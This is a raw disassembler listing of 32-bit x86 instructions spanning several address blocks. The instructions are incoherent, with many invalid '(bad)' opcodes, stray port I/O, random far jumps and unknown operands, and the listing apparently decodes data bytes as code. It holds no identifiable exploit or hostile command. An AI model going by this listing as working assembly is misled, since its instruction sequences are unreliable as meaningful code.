  41b30c:	jge    0x41b295
  41b30e:	outs   dx,BYTE PTR ds:[esi]
  41b30f:	(bad)  
  41b310:	loopne 0x41b2b2
  41b312:	pop    eax
  41b313:	add    DWORD PTR [esp+eax*1-0x595299fd],edx
  41b31a:	cmp    eax,0xce8d61e1
  41b31f:	ficomp WORD PTR [eax+0x76be3299]
  41b325:	das    
  41b326:	les    esi,FWORD PTR [ebx+0x41e60da1]
  41b32c:	or     DWORD PTR [eax+0x5c],ebx
  41b32f:	push   0x5d
  41b331:	adc    cl,BYTE PTR [edx+0x7512db48]
  41b337:	pop    edx
  41b338:	idiv   DWORD PTR ds:0x5446e19
  41b33e:	pop    edx
  41b33f:	out    dx,al
  41b340:	cli    
  41b341:	(bad)  
  41b342:	dec    esp
  41b343:	repz push esp
  41b345:	adc    eax,0xbcb36040
  41b34a:	mov    edx,0xf43de95f
  41b34f:	and    al,0x4f
  41b351:	jae    0x41b34c
  41b353:	fcom   DWORD PTR [ebx-0x6cd3c69f]
  41b359:	jbe    0x41b2dc
  41b35b:	sahf   
  41b35c:	das    
  41b35d:	leave  
  41b35e:	inc    esp
  41b360:	cld    
  41b361:	in     al,0x81
  41b363:	stos   DWORD PTR es:[edi],eax
  41b364:	mov    cl,0x86
  41b366:	dec    ebx
  41b367:	xchg   edx,eax
  41b368:	sahf   
  41b369:	mov    edx,0x5071f35b
  41b36e:	xor    ebx,edx
  41b370:	rcl    DWORD PTR [edi+edx*8-0x53],cl
  41b374:	cmp    cl,0x3a
  41b377:	sub    BYTE PTR [esi+0x251899f7],bh
  41b37d:	xchg   ebx,eax
  41b37e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b37f:	cmp    eax,0xd75d7bd7
  41b384:	add    BYTE PTR es:[eax],dl
  41b387:	outs   dx,DWORD PTR ds:[esi]
  41b388:	pusha  
  41b389:	es pop ss
  41b38b:	sub    cl,al
  41b38d:	mov    edx,0xad492139
  41b392:	push   edx
  41b393:	sub    BYTE PTR ds:0x6ea0ba3,ah
  41b399:	jns    0x41b3be
  41b39b:	int    0x3f
  41b39d:	xchg   esi,eax
  41b39e:	cmp    esi,esi
  41b3a0:	xchg   BYTE PTR ds:0xb70168ba,dh
  41b3a6:	adc    eax,0x165bfd40
  41b3ab:	pop    esi
  41b3ac:	xor    DWORD PTR [ecx-0x731270e5],ebx
  41b3b2:	sbb    eax,0x99dacc7a
  41b3b7:	xchg   esp,eax
  41b3b8:	pop    es
  41b3b9:	ficomp WORD PTR [edi-0x2b]
  41b3bc:	test   BYTE PTR [ebx-0x10],cl
  41b3bf:	add    al,0x7e
  41b3c1:	push   ebp
	...
  41b432:	add    BYTE PTR [eax],al
  41b434:	mov    edi,0xff0fcf82
  41b439:	dec    edi
  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	adc    al,0xf3
  41b442:	out    0x2f,eax
  41b444:	in     al,0x26
  41b446:	add    DWORD PTR [eax],eax
  41b448:	test   BYTE PTR [eax],0x0
  41b44b:	add    cl,ch
  41b44d:	cmp    DWORD PTR [edx-0x4e],edx
  41b450:	int3   
  41b451:	inc    ebp
  41b452:	in     al,0x6b
  41b454:	or     BYTE PTR ds:[edx+0xa],dl
  41b458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b459:	cmp    eax,0xff065ea0
  41b45e:	mov    ah,BYTE PTR [ebx+0x38]
  41b461:	aas    
  41b462:	pop    ebx
  41b463:	and    BYTE PTR [eax-0x17],ch
  41b466:	pop    ds
  41b467:	ins    BYTE PTR es:[edi],dx
  41b468:	ins    DWORD PTR es:[edi],dx
  41b469:	loopne 0x41b460
  41b46b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b46c:	rcl    DWORD PTR [edx+0x22f459fd],cl
  41b472:	leave  
  41b473:	jl     0x41b47a
  41b475:	out    0xeb,al
  41b477:	mul    dl
  41b479:	sub    DWORD PTR [edx],esi
  41b47b:	sbb    al,0xa4
  41b47d:	pop    edi
  41b47e:	ret    
  41b47f:	hlt    
  41b480:	hlt    
  41b481:	sub    DWORD PTR [edi+eiz*8+0x49],edx
  41b485:	repz mov ds:0x67965844,al
  41b48b:	mov    ebx,0xcdf0540b
  41b490:	jae    0x41b442
  41b492:	xor    ch,BYTE PTR [ebx-0x761b3623]
  41b498:	jno    0x41b43d
  41b49a:	pop    ebp
  41b49b:	popa   
  41b49c:	pop    ss
  41b49d:	adc    cl,BYTE PTR [edx]
  41b49f:	inc    ebp
  41b4a0:	mov    ecx,0xc7f11f4c
  41b4a5:	or     BYTE PTR [esi],bl
  41b4a7:	inc    ecx
  41b4a8:	in     al,dx
  41b4a9:	xchg   esp,eax
  41b4aa:	xchg   ebx,eax
  41b4ab:	arpl   WORD PTR [ecx+0x5a],dx
  41b4ae:	dec    esi
  41b4af:	lock dec edx
  41b4b1:	popa   
  41b4b2:	push   ecx
  41b4b3:	out    0xbc,eax
  41b4b5:	add    BYTE PTR [ecx+0x2d3c7068],cl
  41b4bb:	pusha  
  41b4bc:	mov    ah,BYTE PTR [ebx-0x6d]
  41b4bf:	jl     0x41b531
  41b4c1:	push   ecx
  41b4c2:	sbb    ch,BYTE PTR [ebx+edi*8]
  41b4c5:	rep ins BYTE PTR es:[edi],dx
  41b4c7:	cmp    DWORD PTR [ebp-0x2e],eax
  41b4ca:	dec    edi
  41b4cb:	pop    ecx
  41b4cc:	cmc    
  41b4cd:	sbb    DWORD PTR [edx],ebx
  41b4cf:	imul   ecx,DWORD PTR [ecx-0x60],0xffffff91
  41b4d3:	mov    esp,0x399c69fa
  41b4d8:	adc    al,0xce
  41b4da:	cmp    eax,0x56576041
  41b4df:	xor    eax,ebp
  41b4e1:	mov    dh,0x1a
  41b4e3:	mov    edx,0xff704e4
  41b4e8:	dec    esi
  41b4e9:	les    esi,FWORD PTR [edx-0xf]
  41b4ec:	ficomp DWORD PTR [eax]
  41b4ee:	jmp    0x1391:0xee4d8e9b
  41b4f5:	add    esi,DWORD PTR [edi]
  41b4f7:	inc    eax
  41b4f8:	mov    bh,0x2
  41b4fa:	imul   ebx,DWORD PTR [edi+0x5a0422f3],0x6f4d72e1
  41b504:	rep stos DWORD PTR es:[edi],eax
  41b506:	imul   BYTE PTR [ebx+edx*8]
  41b509:	or     DWORD PTR [ebp+0x3a70651b],edi
  41b50f:	clc    
  41b510:	arpl   WORD PTR [ebp+0x41da8012],sp
  41b516:	ds das 
  41b518:	mov    al,0xe4
  41b51a:	mov    dl,0x3
  41b51c:	mov    cl,0x1f
  41b51e:	js     0x41b4d8
  41b520:	shl    al,0xda
  41b523:	sbb    dh,BYTE PTR [ebx-0x20]
  41b526:	daa    
  41b527:	adc    DWORD PTR [eax-0x3a],ebp
  41b52a:	push   edx
  41b52b:	mov    WORD PTR [edx+0x49],cs
  41b52e:	mov    esp,ebx
  41b530:	sbb    edi,DWORD PTR [ebp-0x26]
  41b533:	retf   
  41b534:	push   ebx
  41b535:	cdq    
  41b536:	fidivr DWORD PTR ds:0xc8f9b104
  41b53c:	jle    0x41b518
  41b53e:	dec    ebx
  41b53f:	in     eax,0x8a
  41b541:	jp     0x41b543
	...
  41b5b3:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0xd6
  41b5c1:	cdq    
  41b5c2:	sahf   
  41b5c3:	push   esi
  41b5c4:	fisub  DWORD PTR [edi]
  41b5c6:	add    DWORD PTR [eax],eax
  41b5c8:	test   BYTE PTR [eax],0x0
  41b5cb:	add    cl,dh
  41b5cd:	ja     0x41b5c6
  41b5cf:	mov    ah,0xcd
  41b5d1:	ds fs mov edi,0x56e52a0
  41b5d8:	js     0x41b5c5
  41b5da:	(bad)  
  41b5db:	cdq    
  41b5dc:	xor    al,cl
  41b5de:	cmp    ecx,DWORD PTR [edi+0x1f]
  41b5e1:	or     DWORD PTR [edx-0x5c],ebp
  41b5e4:	xchg   dh,al
  41b5e6:	shl    BYTE PTR [edx-0x21],1
  41b5e9:	dec    ebp
  41b5ea:	or     eax,0x84fa2b2b
  41b5ef:	adc    DWORD PTR [edi],0x26d2974
  41b5f5:	dec    ebp
  41b5f6:	adc    cl,BYTE PTR [esi+0x4354a206]
  41b5fc:	(bad)  
  41b5fd:	push   0xffffffb0
  41b5ff:	(bad)
  41b602:	mov    WORD PTR [ebx],fs
  41b604:	xor    ebx,eax
  41b606:	enter  0x494a,0x53
  41b60a:	push   ecx
  41b60b:	mov    BYTE PTR [edi-0x56],bl
  41b60e:	callw  0x14e5
  41b612:	adc    BYTE PTR ds:0xcbfed6d6,bl
  41b618:	imul   eax,esp,0x49601997
  41b61e:	nop
  41b61f:	lods   eax,DWORD PTR ds:[esi]
  41b620:	in     eax,dx
  41b621:	sub    BYTE PTR [ecx],dl
  41b623:	add    eax,0x8d118a67
  41b628:	cmp    al,0x84
  41b62a:	push   ecx
  41b62b:	inc    ebp
  41b62c:	nop
  41b62d:	scas   eax,DWORD PTR es:[edi]
  41b62e:	es or  al,0xd5
  41b631:	sar    BYTE PTR [edi+0x46],cl
  41b634:	cmove  ebp,DWORD PTR [ecx-0x1c641701]
  41b63b:	dec    ebx
  41b63c:	push   ds
  41b63d:	xchg   DWORD PTR [esi-0x26a78a70],esi
  41b643:	or     ebp,ebx
  41b645:	call   0x8405:0x28389927
  41b64c:	mov    al,ds:0xb257dd9d
  41b651:	hlt    
  41b652:	mov    dh,0x66
  41b654:	mov    ah,0x19
  41b656:	jl     0x41b6d7
  41b658:	retf   
  41b659:	cli    
  41b65a:	add    al,0x30
  41b65c:	inc    edx
  41b65d:	retf   
  41b65e:	add    dl,BYTE PTR [ecx-0x69cfd723]
  41b664:	iret   
  41b665:	call   0xfbfe6582
  41b66a:	pop    esi
  41b66b:	xor    eax,0x1b1be3f1
  41b670:	cmc    
  41b671:	dec    esi
  41b672:	push   ebp
  41b673:	cld    
  41b674:	push   ds
  41b675:	or     bh,BYTE PTR [eax-0x2f]
  41b678:	iret   
  41b679:	fld    TBYTE PTR [ecx+0x64]
  41b67c:	aam    0xe9
  41b67e:	xchg   BYTE PTR [ebp+0x2],al
  41b681:	adc    al,0x4b
  41b683:	inc    eax
  41b684:	adc    edi,DWORD PTR [ecx-0x9]
  41b687:	adc    ah,BYTE PTR [ecx-0x74402d94]
  41b68d:	popa   
  41b68e:	dec    esp
  41b68f:	std    
  41b690:	into   
  41b691:	xchg   edi,eax
  41b692:	cli    
  41b693:	jb     0x41b66b
  41b695:	xor    edx,esp
  41b697:	in     al,dx
  41b698:	sbb    DWORD PTR [edi+edi*1],ecx
  41b69b:	add    di,WORD PTR [ebx-0x7c817198]
  41b6a2:	xchg   edx,eax
  41b6a3:	mov    ecx,DWORD PTR [ecx+0x39]
  41b6a6:	rcr    DWORD PTR [eax-0x1c],cl
  41b6a9:	xor    al,0xbb
  41b6ab:	push   ebp
  41b6ac:	mov    esi,0x9ed3d33c
  41b6b1:	imul   DWORD PTR [ecx+0x7c]
  41b6b4:	xchg   ecx,eax
  41b6b5:	(bad)  
  41b6b6:	cmp    al,0x24
  41b6b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6b9:	les    eax,FWORD PTR [edi+eiz*8+0x336cec6]
  41b6c0:	jnp    0x41b67d
	...
  41b732:	add    BYTE PTR [eax],al
  41b734:	repz xchg edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    BYTE PTR [ecx-0x2fb64773],cl
  41b745:	sub    BYTE PTR [ecx],al
  41b747:	add    dh,dh
  41b749:	add    BYTE PTR [eax],al
  41b74b:	add    BYTE PTR [esi-0x1c8c7273],cl
  41b751:	add    esi,DWORD PTR [edi]
  41b753:	pusha  
  41b754:	fcom   st(3)
  41b756:	mov    ecx,0x298d33d4
  41b75b:	mov    ebp,esi
  41b75d:	adc    bh,dh
  41b75f:	in     al,0xe8
  41b761:	cmp    al,BYTE PTR [ebx-0x41]
  41b764:	push   ss
  41b765:	in     eax,0xc8
  41b767:	jg     0x41b7a0
  41b769:	imul   esi,ebx,0x2a
  41b76c:	test   eax,0xa2dea96
  41b771:	fiadd  WORD PTR [eax+0x27]
  41b774:	outs   dx,BYTE PTR ds:[esi]
  41b775:	mov    ebp,0x638d8e40
  41b77a:	pop    edi
  41b77b:	iret   
  41b77c:	fisttp QWORD PTR [ebx+eax*4-0x67628385]
  41b783:	push   edx
  41b784:	stc    
  41b785:	mov    dl,0x67
  41b787:	mov    ecx,0xd87c398b
  41b78c:	fmulp  st(1),st
  41b78e:	ret    
  41b78f:	jae    0x41b75f
  41b791:	inc    eax
  41b792:	and    al,0x82
  41b794:	(bad)  
  41b795:	mov    ecx,0xb36fe159
  41b79a:	shl    ecx,0xf
  41b79d:	shr    BYTE PTR [edx+edi*4+0x68ce3844],1
  41b7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7a5:	aad    0x51
  41b7a7:	lods   al,BYTE PTR ds:[esi]
  41b7a8:	out    0x49,eax
  41b7aa:	mov    DWORD PTR [ebp-0x280a1534],edx
  41b7b0:	ss and eax,0xdc3142e2
  41b7b6:	scas   al,BYTE PTR es:[edi]
  41b7b7:	and    eax,0x40feee9a
  41b7bc:	and    eax,0x91a99644
  41b7c1:	xchg   esi,eax
  41b7c2:	ds sti 
  41b7c4:	xchg   esi,eax
  41b7c5:	cli    
  41b7c6:	mov    esp,0xd9d7e0bf
  41b7cb:	add    dh,bh
  41b7cd:	inc    edi
  41b7ce:	cmp    al,0xb6
  41b7d0:	lock sub ebx,DWORD PTR [esi]
  41b7d3:	jae    0x41b813
  41b7d5:	pop    es
  41b7d6:	sbb    al,0x5c
  41b7d8:	push   ds
  41b7d9:	dec    esp
  41b7da:	inc    eax
  41b7db:	loope  0x41b7b7
  41b7dd:	outs   dx,BYTE PTR ds:[esi]
  41b7de:	sbb    ecx,DWORD PTR [ebx-0x4f944bc8]
  41b7e4:	inc    esi
  41b7e5:	std    
  41b7e6:	mov    ebp,0x65878a25
  41b7eb:	daa    
  41b7ec:	adc    edx,DWORD PTR [edx-0x4b]
  41b7ef:	add    eax,DWORD PTR [ebx]
  41b7f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7f2:	mov    bl,0x83
  41b7f4:	xchg   esi,eax
  41b7f5:	outs   dx,DWORD PTR ds:[esi]
  41b7f6:	ja     0x41b835
  41b7f8:	xchg   DWORD PTR [ecx],ebp
  41b7fa:	sub    BYTE PTR [edi],bl
  41b7fc:	sbb    ch,BYTE PTR [ecx]
  41b7fe:	(bad)  
  41b7ff:	ja     0x41b785
  41b801:	cmp    eax,0xe5ff15e9
  41b806:	add    al,BYTE PTR [esi+0x25d39a1a]
  41b80c:	inc    ecx
  41b80d:	or     al,0x2a
  41b80f:	inc    eax
  41b810:	rol    BYTE PTR [esp+ecx*2+0x2d],1
  41b814:	lds    ebp,FWORD PTR [esi-0x79016664]
  41b81a:	mov    BYTE PTR [ecx+esi*4-0x3b7f7317],bl
  41b821:	gs cld 
  41b823:	dec    edx
  41b824:	out    dx,al
  41b825:	add    al,0x46
  41b827:	add    al,0x94
  41b829:	cmp    BYTE PTR [eax],0x74
  41b82c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b82d:	pushf  
  41b82e:	push   ss
  41b82f:	mov    eax,ds:0x25b0dd79
  41b834:	fstp   DWORD PTR [ecx+0x4c1a527f]
  41b83a:	cmp    eax,0x29e07a4a
  41b83f:	fist   WORD PTR [edi]
  41b841:	mov    bh,0x0
	...
  41b8b3:	add    BYTE PTR ds:0xcf4a867e,dh
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	jnp    0x41b934
  41b8c2:	mov    ecx,0x129c6d6
  41b8c7:	add    dh,dh
  41b8c9:	add    BYTE PTR [eax],al
  41b8cb:	add    dh,dh
  41b8cd:	(bad)
  41b8d0:	push   ebp
  41b8d1:	xor    ebx,edi
  41b8d3:	ret    
  41b8d4:	dec    ecx
  41b8d5:	je     0x41b8ce
  41b8d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8d8:	stc    
  41b8d9:	into   
  41b8da:	mov    al,gs:0x67ba9145
  41b8e0:	xor    cl,bl
  41b8e2:	adc    al,0x87
  41b8e4:	jmp    0x3c56dc00
  41b8e9:	mov    bl,0xd6
  41b8eb:	xor    al,0xcb
  41b8ed:	jb     0x41b963
  41b8ef:	push   0x21
  41b8f1:	push   ebx
  41b8f2:	in     al,0x5
  41b8f4:	in     eax,0x2d
  41b8f6:	in     al,dx
  41b8f7:	jae    0x41b940
  41b8f9:	ret    0x82c6
  41b8fc:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8fe:	jb     0x41b973
  41b900:	xor    ch,BYTE PTR [ebx-0x3f7b6867]
  41b906:	repnz stos BYTE PTR es:[edi],al
  41b908:	inc    ebx
  41b909:	jne    0x41b908
  41b90b:	dec    edx
  41b90c:	xchg   edx,eax
  41b90d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b90e:	xchg   esi,eax
  41b90f:	mov    ss,WORD PTR [esi+ebp*4-0x1f3536c2]
  41b916:	push   esi
  41b917:	pop    ecx
  41b918:	test   al,0x79
  41b91a:	dec    ecx
  41b91b:	lea    eax,[ebp-0x70eb7a32]
  41b921:	xor    BYTE PTR [edx-0x211ca98a],0x51
  41b928:	fs out 0xf0,al
  41b92b:	mov    ds:0xfc16ed30,eax
  41b930:	in     eax,0xc9
  41b932:	pop    es
  41b933:	or     eax,0xc30d6db6
  41b938:	pop    esi
  41b939:	push   edx
  41b93a:	imul   ch
  41b93c:	stos   BYTE PTR es:[edi],al
  41b93d:	rol    BYTE PTR [ebx-0x6c7a23ba],1
  41b943:	test   BYTE PTR [ecx],al
  41b945:	push   es
  41b946:	repnz xlat BYTE PTR ds:[ebx]
  41b948:	xor    BYTE PTR [edx],dh
  41b94a:	(bad)  
  41b94c:	fld    TBYTE PTR [eax-0x3926b7fc]
  41b952:	or     BYTE PTR gs:[eax+0x52],0xe1
  41b957:	pop    ebx
  41b958:	adc    al,0x2e
  41b95a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b95b:	arpl   WORD PTR [ecx+0x4b],bp
  41b95e:	rol    ch,1
  41b960:	aad    0x1f
  41b962:	sti    
  41b963:	je     0x41b9cb
  41b965:	mov    WORD PTR [eax+0xa],gs
  41b968:	ret    
  41b969:	pop    ebx
  41b96a:	aam    0xcb
  41b96c:	push   0xffffff8a
  41b96e:	inc    esi
  41b96f:	push   ds
  41b970:	dec    edi
  41b971:	fldcw  WORD PTR [ebx+edx*1-0x35ea6ba6]
  41b978:	sbb    al,0x3
  41b97a:	out    dx,al
  41b97b:	jno    0x41b9f4
  41b97d:	das    
  41b97e:	add    eax,0x4237ad7e
  41b983:	push   esp
  41b984:	nop
  41b985:	pop    es
  41b986:	aas    
  41b987:	rol    BYTE PTR [esi],cl
  41b989:	call   0xdc05:0xbd9b9d55
  41b990:	je     0x41b95e
  41b992:	push   0x52
  41b994:	icebp  
  41b995:	mov    bh,0xe4
  41b997:	adc    eax,0xf758a76
  41b99c:	mov    ch,0x1f
  41b99e:	cmp    BYTE PTR [eax],0x48
  41b9a1:	sub    eax,0x9b5c0517
  41b9a6:	add    eax,0x6e781f5a
  41b9ab:	inc    edi
  41b9ac:	outs   dx,BYTE PTR ds:[esi]
  41b9ad:	pop    esp
  41b9ae:	stos   BYTE PTR es:[edi],al
  41b9af:	shl    DWORD PTR [eax],0x49
  41b9b2:	mov    ecx,0x73d5d9de
  41b9b7:	lahf   
  41b9b8:	push   es
  41b9b9:	sbb    BYTE PTR [ecx-0x5f],ah
  41b9bc:	fbld   TBYTE PTR [edi]
  41b9be:	jge    0x41b9f3
  41b9c0:	or     BYTE PTR [ecx+0x0],cl
	...
  41ba33:	add    bh,dh
  41ba35:	add    esp,ebx
  41ba37:	mov    ah,0xfe
  41ba39:	std    
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	mov    edi,0xbc7fbcf4
  41ba45:	sub    al,BYTE PTR [ecx]
  41ba47:	add    dh,dh
  41ba49:	add    BYTE PTR [eax],al
  41ba4b:	add    BYTE PTR [eax-0x78b0a3db],ah
  41ba51:	mov    cl,0x14
  41ba53:	nop
  41ba54:	imul   esi,DWORD PTR [ebp+0x2abc9b1d],0x76
  41ba5b:	push   ebx
  41ba5c:	xor    ah,BYTE PTR [ecx+eax*1]
  41ba5f:	jecxz  0x41ba0a
  41ba61:	cmp    al,0xbe
  41ba63:	cdq    
  41ba64:	adc    eax,DWORD PTR [ebx-0x46]
  41ba67:	mov    al,ds:0x1ef9e46a
  41ba6c:	mov    ebp,0x787bd8df
  41ba71:	or     eax,esi
  41ba73:	lea    eax,[ebp+0x36]
  41ba76:	xchg   edx,eax
  41ba77:	stos   BYTE PTR es:[edi],al
  41ba78:	jmp    0x9b10:0x9ceb3843
  41ba7f:	cld    
  41ba80:	rep ins DWORD PTR es:[edi],dx
  41ba82:	out    dx,al
  41ba83:	xchg   ebp,eax
  41ba84:	repz aad 0x1b
  41ba87:	mov    ?,ebx
  41ba89:	inc    edi
  41ba8a:	jae    0x41ba37
  41ba8c:	gs xchg ebx,eax
  41ba8e:	jo     0xaa98e853
  41ba94:	sbb    DWORD PTR [esi+0x64],esi
  41ba97:	imul   edx,DWORD PTR [edi],0x2c
  41ba9a:	(bad)  
  41ba9b:	push   0x4f
  41ba9d:	add    al,0xc8
  41ba9f:	xchg   esp,eax
  41baa0:	mov    cl,0x1f
  41baa2:	xor    dl,BYTE PTR [eax]
  41baa4:	cmc    
  41baa5:	std    
  41baa6:	in     al,0x7c
  41baa8:	push   ss
  41baa9:	mov    WORD PTR [esi+0x1e],?
  41baac:	in     eax,dx
  41baad:	inc    eax
  41baae:	popa   
  41baaf:	mov    esp,?
  41bab1:	sbb    DWORD PTR [edi+0x5a],edx
  41bab4:	retf   0x86e6
  41bab7:	mov    al,0xc3
  41bab9:	lea    eax,[ebp-0x1a]
  41babc:	pop    ebx
  41babd:	cmp    ecx,DWORD PTR [edi+0x1f]
  41bac0:	pop    esp
  41bac1:	or     eax,0x66607558
  41bac6:	xor    DWORD PTR [ebx],edx
  41bac8:	addr16 mov ebp,0x46d6d0b6
  41bace:	jno    0x41bace
  41bad0:	out    dx,al
  41bad1:	mov    cl,0xf3
  41bad3:	cli    
  41bad4:	push   0xc0114ecc
  41bad9:	imul   ebx,edi,0x4fa244a5
  41badf:	pop    esp
  41bae0:	xchg   esp,eax
  41bae1:	repz cmp DWORD PTR [esi],ecx
  41bae4:	ror    DWORD PTR [esi],cl
  41bae6:	in     al,dx
  41bae7:	add    ah,BYTE PTR [ebx+0x41079d5f]
  41baed:	sbb    bl,dl
  41baef:	je     0x41bb6c
  41baf1:	pop    ss
  41baf2:	or     cl,BYTE PTR [edx]
  41baf4:	push   esp
  41baf5:	int    0x7a
  41baf7:	dec    eax
  41baf8:	inc    esi
  41baf9:	inc    esp
  41bafa:	sub    eax,0xf3ba504a
  41baff:	std    
  41bb00:	cmp    eax,0x6da8bda
  41bb05:	jg     0x41bb75
  41bb07:	add    ebx,DWORD PTR [ebx+0x32c24d5e]
  41bb0d:	and    eax,0x3baff872
  41bb12:	push   esp
  41bb13:	shl    ecx,0xe0
  41bb16:	xchg   ebx,eax
  41bb17:	iret   
  41bb18:	jp     0x41bacb
  41bb1a:	or     al,0xef
  41bb1c:	jnp    0x41bad7
  41bb1e:	jl     0x41bb6a
  41bb20:	stos   DWORD PTR es:[edi],eax
  41bb21:	lock mov esp,0xcafcf1bd
  41bb27:	iret   
  41bb28:	sub    al,0x13
  41bb2a:	jp     0x41bb8c
  41bb2c:	in     al,dx
  41bb2d:	popf   
  41bb2e:	std    
  41bb2f:	mov    esp,0xa5e9f078
  41bb34:	fbstp  TBYTE PTR [ecx+0x34]
  41bb37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb38:	cmc    
  41bb39:	mov    bh,0x3e
  41bb3b:	mov    DWORD PTR [esi-0x15],esi
  41bb3e:	xor    esp,esi
  41bb40:	mov    ecx,0xa0
	...
  41bbb1:	add    BYTE PTR [eax],al
  41bbb3:	add    BYTE PTR [edx+0x49],ch
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	push   0xffffff9d
  41bbc2:	sub    DWORD PTR [edx],ecx
  41bbc4:	mov    dl,0x2b
  41bbc6:	add    DWORD PTR [eax],eax
  41bbc8:	test   BYTE PTR [eax],0x0
  41bbcb:	add    cl,ch
  41bbcd:	jecxz  0x41bbd9
  41bbcf:	cwde   
  41bbd0:	and    esp,eax
  41bbd2:	ja     0x41bbc2
  41bbd4:	frstor [ebx+0x3924462e]
  41bbda:	push   cs
  41bbdb:	and    BYTE PTR [esi],ch
  41bbdd:	addr16 sahf 
  41bbdf:	pop    edx
  41bbe0:	int    0xaa
  41bbe2:	scas   al,BYTE PTR es:[edi]
  41bbe3:	mov    cs,WORD PTR [edx-0x3]
  41bbe6:	ja     0x41bbe4
  41bbe8:	pushf  
  41bbe9:	cwde   
  41bbea:	mov    ds:0xcc707fff,al
  41bbef:	imul   edi,DWORD PTR [ebx],0xacc30f11
  41bbf5:	(bad)  
  41bbf6:	div    DWORD PTR [ebp+0x8]
  41bbf9:	imul   DWORD PTR [ebx+0x5603d025]
  41bbff:	sub    ch,dl
  41bc01:	scas   al,BYTE PTR es:[edi]
  41bc02:	popf   
  41bc03:	out    dx,eax
  41bc04:	mov    al,0x1a
  41bc06:	stos   DWORD PTR es:[edi],eax
  41bc07:	es int3 
  41bc09:	neg    DWORD PTR [edx-0x59]
  41bc0c:	xor    BYTE PTR [ebx],dl
  41bc0e:	dec    ebp
  41bc0f:	dec    ebp
  41bc10:	stos   BYTE PTR es:[edi],al
  41bc11:	pop    es
  41bc12:	lahf   
  41bc13:	std    
  41bc14:	xchg   esp,eax
  41bc15:	cmc    
  41bc16:	xchg   edx,eax
  41bc17:	hlt    
  41bc18:	mov    ebp,0xfab12300
  41bc1d:	mov    edx,0x4f98ea33
  41bc22:	std    
  41bc23:	es arpl di,sp
  41bc26:	jno    0x41bc4c
  41bc28:	(bad)  
  41bc29:	les    edi,FWORD PTR [ebx]
  41bc2b:	pop    esi
  41bc2c:	add    al,0x2
  41bc2e:	mov    edx,0x63fb2acc
  41bc33:	pop    edx
  41bc34:	adc    eax,0x413b144c
  41bc39:	cmp    dh,BYTE PTR [ebp+0x4b]
  41bc3c:	jmp    0x41bbcd
  41bc3e:	enter  0x6e2d,0xcf
  41bc42:	inc    eax
  41bc43:	dec    edi
  41bc44:	or     cl,dh
  41bc46:	mov    bh,0x78
  41bc48:	fsubrp st(3),st
  41bc4a:	popf   
  41bc4b:	add    ah,ah
  41bc4d:	ds daa 
  41bc4f:	lahf   
  41bc50:	xchg   BYTE PTR ds:0x3f01ee2c,dl
  41bc56:	aaa    
  41bc57:	push   edi
  41bc58:	outs   dx,BYTE PTR ds:[esi]
  41bc59:	xor    BYTE PTR [eax+0x4],dh
  41bc5c:	add    ebp,DWORD PTR [eax+0x601e132]
  41bc62:	daa    
  41bc63:	push   ds
  41bc64:	aaa    
  41bc65:	and    esp,DWORD PTR [edx-0x6367cb53]
  41bc6b:	lahf   
  41bc6c:	inc    edi
  41bc6d:	adc    DWORD PTR [eax+0x2],esi
  41bc70:	jmp    0x6c4a:0xd4bb207b
  41bc77:	jb     0x41bc28
  41bc79:	mov    edx,0xd2cf74b9
  41bc7e:	xchg   dl,cl
  41bc80:	mov    ebx,0x27668cda
  41bc85:	shr    BYTE PTR [edi+0x45e9127a],cl
  41bc8b:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41bc8d:	add    bh,BYTE PTR [eax+0x67e15461]
  41bc93:	jg     0x41bc4a
  41bc95:	pop    DWORD PTR [ebp-0x5242b511]
  41bc9b:	std    
  41bc9c:	test   al,0xc
  41bc9e:	mov    ch,0x5
  41bca0:	sub    ah,BYTE PTR [edi-0x11e2f1d1]
  41bca6:	or     cl,ah
  41bca8:	ins    BYTE PTR es:[edi],dx
  41bca9:	xchg   ebp,eax
  41bcaa:	retf   
  41bcab:	pop    es
  41bcac:	sub    al,0xdc
  41bcae:	add    al,0xf2
  41bcb0:	add    dl,BYTE PTR [eax]
  41bcb2:	dec    esi
  41bcb3:	lods   al,BYTE PTR ds:[esi]
  41bcb4:	jnp    0x41bc58
  41bcb6:	ret    
  41bcb7:	test   al,0x30
  41bcb9:	daa    
  41bcba:	rol    BYTE PTR [ebx],1
  41bcbc:	sbb    DWORD PTR [eax-0x4],edx
  41bcbf:	lods   al,BYTE PTR ds:[esi]
  41bcc0:	repnz dec ebx
	...
  41bd32:	add    BYTE PTR [eax],al
  41bd34:	push   ebp
  41bd35:	clc    
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0x8ebf1c9a
  41bd41:	cli    
  41bd42:	jno    0x41bcf3
  41bd44:	test   al,0x2c
  41bd46:	add    DWORD PTR [eax],eax
  41bd48:	test   BYTE PTR [eax],0x0
